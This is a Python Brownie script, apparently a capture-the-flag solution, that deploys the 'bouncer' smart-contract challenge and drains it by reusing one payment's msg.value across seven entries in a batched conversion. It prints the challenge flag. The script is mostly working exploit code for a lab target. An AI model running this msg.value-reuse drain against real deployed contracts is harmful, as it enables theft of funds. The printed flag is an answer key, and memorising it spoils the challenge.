from brownie import Contract, WETH9, Bouncer, SetupBouncer
from web3 import Web3
import time, sys
from scripts.helpful_scripts import get_accounts

"""
name: bouncer
author: gakonst
flag: PCTF{SH0ULDV3_US3D_W37H}
tags: ["pwn"]
description: |
    Can you enter the party?
"""


def deploy():
    global deployer, attacker, bouncer_contract, ETH_CONST
    [deployer, attacker] = get_accounts(2)
    ETH_CONST = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"

    # 开始部署
    # weth = WETH9.deploy({"from": deployer})

    setup_contract = SetupBouncer.deploy(
        {"from": deployer, "value": Web3.toWei(100, "ether")}
    )
    bouncer_contract = Bouncer.at(setup_contract.bouncer())


def attack():
    # 攻击代码写到这里
    value = Web3.toWei(10, "ether")
    num_enters = 7
    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
    for _ in range(num_enters):
        tx = bouncer_contract.enter(
            ETH_CONST, value, {"from": attacker, "value": Web3.toWei(1, "ether")}
        )
        tx.wait(1)
    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))

    tx = bouncer_contract.convertMany(
        attacker, list(range(num_enters)), {"from": attacker, "value": value}
    )
    tx.wait(1)
    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
    print()
    tx = bouncer_contract.redeem(
        ETH_CONST, bouncer_contract.balance(), {"from": attacker}
    )
    tx.wait(1)

    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
    print()
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        assert bouncer_contract.balance() == 0
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
